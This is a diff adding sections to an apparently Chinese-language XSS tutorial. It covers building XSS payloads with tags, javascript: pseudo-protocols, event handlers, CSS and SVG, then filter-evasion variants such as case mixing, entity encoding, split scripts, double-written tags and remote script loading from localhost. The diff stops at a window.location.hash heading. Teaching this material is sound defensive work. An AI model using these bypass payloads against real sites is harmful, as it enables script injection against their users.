@@ -70,3 +70,150 @@ DOM XSS比较特殊。owasp关于DOM型号XSS的定义是基于DOM的XSS是一�
 
 我们以锚点的方式提交PoC。PoC并不会发送到服务器，但是已经触发了XSS。查看当前页面的源代码如下
 
+## XSS的构造
+- 利用[<>]构造HTML/JS
+可以利用[<>]构造HTML标签和<script>标签
+在测试页面提交参数[<h1 style='color:red'>利用[<>]构造HTML/JS</h1>]
+
+提交[<script>alert(/xss/)</script>]
+
+- 伪协议
+
+也可以使用javascript:伪协议的方式构造XSS
+[javascript:alert(/xss/);]
+提交参数[<a href="javascript:alert(/xss/)">touch me!</a>],然后点击超链接，即可触发XSS
+
+也可以使用img标签的伪协议，但是这种方法在IE6下测试成功。[<img src="javascript:alert('xss')">]
+
+- 产生自己的事件
+
+“事件驱动”是一种比较经典的编程思想。在网页中会发生很多事件（比如鼠标移动，键盘输入等），JS可以对这些事件进行响应。所以我们可以通过事件触发JS函数，触发XSS。
+
+事件种类
+windows事件            对windows对象触发的事件
+Form事件               HTML表单内的动作触发事件
+keyboard事件           键盘按键
+Mouse事件              由鼠标或类似用户动作触发的事件
+Media事件              由多媒体触发的事件
+
+如，[<img src='./smile.jpg' onmouseover='alert(/xss/)'>]这个标签会引入一个图片，然后鼠标悬停在图片上的时候，会触发XSS代码。
+
+单行文本框的键盘点击事件，[<input type="text" onkeydown="alert(/xss/)">],当点击键盘任意一个按键的时候出发。
+<input type="text" onkeyup="alert(/xss/)">
+<input type="button" onclick="alert(/xss/)">
+[<img src='#' onerror='alert(/xss/)'>]
+
+- 利用CSS跨站（old）
+
+我们也可以利用CSS（层叠样式表）触发XSS。但是这种方法比较古老，基本上不适合现在主流的浏览器，但是从学习的角度，我们需要了解这种类型的XSS，以下代码均在IE6下测试
+
+@ 行内样式
+[<div style="background-image:url(javascript:alert(/xss/))">]
+
+@ 页内样式
+[<style>Body{background-image:url(javascript:alert(/xss/))}</style>]
+
+@ 外部样式
+[<link rel="stylesheet" type="text/css" href="./xss.css"><div>hello<div>]
+
+- 其他标签以及手法(H5)
+我们可以用其他标签触发XSS
+[<svg onload="alert(/xss/)">] 这个语句还是比较简洁的
+
+[<input onfocus=alert(/xss/) autofocus>]
+
+## XSS的变形
+
+我们可以构造XSS代码进行各种变形，以绕过XSS过滤器的检测。变形方式主要有以下几种
+
+- 大小写转换
+
+可以将payload进行大小写转换。如下面两个例子。
+<Img sRc='#' Onerror="alert(/xss/)">
+
+<a hREf="javaScript:alert(/xss/)">click me</a>
+
+- 引号的使用
+
+HTML语言中对引号的使用不敏感，但是某些过滤函数是“锱铢必较”。
+<img src="#" onerror="alert(/xss/)"/>
+
+<img src='#' onerror='alert(/xss/)'/>
+
+<img src=# onerror=alert(/xss/)/>
+
+- [/]代替空格
+
+可以利用左斜线代替空格
+<Img/sRc='#'/Onerror='alert(/xss/)'/>
+
+- 回车
+
+我们可以在一些位置添加Tab（水平制表符）和回车符，来绕过关键字检测。
+<Img/sRc='#'/Onerror  ='alert(/xss/)' />
+
+<A hREf="j
+a vascript:alert(/xss/)">click me!</a>
+
+- 对标签属性值进行转码
+
+可以对标签属性值进行转码，用来绕过过滤。对应编码如下
+
+字母     ASCII码       十进制编码        十六进制编码
+a        97            &#97;             &#x61;
+e        101           &#101;            &#x65;
+
+经过简单编码之后的样子
+<a hREf="j&#97;v&#x61;script:alert(/xss/)">click me!</a>
+
+另外，我们可以将以下字符插入到任意位置
+Tab      &#9
+换行     &#10
+回车     &#13
+
+可以将以下字符插入到头部位置
+SOH     &#01
+STX     &#02
+
+经过编码后的样子
+<A hREf="&#01;j&#97;v&#x61;s&#9;c&#10;r&#13;ipt:alert(/xss/)">
+click me!
+</a>
+
+- 拆分跨站
+
+<script>z='alert'</script>
+<script>z=z+'(/xss/)'</script>
+<script>eval(z)</script>
+
+- 双写绕过
+
+```
+<script>
+<scr<script>ipt>
+```
+
+- CSS中的变形
+
+@ 使用全角字符
+width:e x p r e s s i o n(alert(/xss/))
+
+@ 注释会被浏览器忽略
+width:expr/*~*/ession(alert(/x~s~s/))
+
+@ 样式表中的[\]和[\0]
+<style>@import 'javasc\ri\0pt:alert("xss")';</style>
+
+Shellcode的使用
+  Shellcode就是在利用漏洞所执行的代码
+  完整的XSS攻击，会将Shellcode存放在一定的地方，然后触发漏洞。调用Shellcode。
+
+- 远程调用JS
+
+可以将JS代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如[<script src="http://127.0.0.1/XSS-TEST/normal/xss.js"></script>]，这是比较常用的方式。XSS。js的内容如下：
+```
+alert('xss.js');
+```
+
+- windows.location.hash
+
